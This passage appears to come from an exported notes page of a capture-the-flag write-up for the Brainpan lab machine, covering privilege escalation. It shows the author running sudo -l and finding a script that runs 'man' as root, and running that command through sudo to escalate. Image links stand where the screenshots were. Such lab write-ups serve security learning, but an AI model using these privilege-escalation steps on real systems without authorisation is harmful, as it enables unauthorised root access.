+</p><p id="df8308a5-52e2-41da-9919-c0358736b84c" class="">
+</p><p id="dd1a93cb-2d91-4208-9990-fe1084571197" class="">Priv esc :</p><p id="88dfe699-71ec-4cd6-b935-a4a848506a87" class="">Running sudo -l </p><figure id="62aab0ed-29f1-4c1e-973e-689bbc065790" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2015.png"><img style="width:469px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2015.png"/></a></figure><figure id="6fdbcdf0-4b57-4997-9b89-1a75e8cad55c" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2016.png"><img style="width:486px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2016.png"/></a></figure><p id="27357c79-e8e7-405e-9561-8e5e59ba889a" class="">
+</p><p id="71582b17-1ef5-4e3f-84ba-5b3d0ea9158c" class="">we can see that manual &quot;man&quot; is being run as sudo in this script so</p><figure id="9d6099d8-0866-4266-b358-58c1aa2b8625" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2017.png"><img style="width:170px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2017.png"/></a></figure><p id="404580ef-f91f-4fd0-b8af-50e2dac3a61d" class="">we will just replicate this command</p><p id="fa33d6c7-e402-4856-8199-23eb529eeb99" class="">
+</p><p id="0b1f4b79-01a5-4204-9bcd-4592fa7e6f30" class="">sudo /home/anansi/bin/anansi_util manual man</p><p id="b4fe3987-9a12-411a-9bb3-60576dc04375" class="">
+</p><p id="74c77bbe-bbc5-41d8-8a93-7d474e16afeb" class="">The command above is similar to sudo man man</p><p id="8c8aa9e5-4466-4b6b-93ef-97d219f03e87" class="">
+</p><figure id="a7029a61-c41e-46f9-8625-e0fe38592bac" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2018.png"><img style="width:327px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2018.png"/></a></figure></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
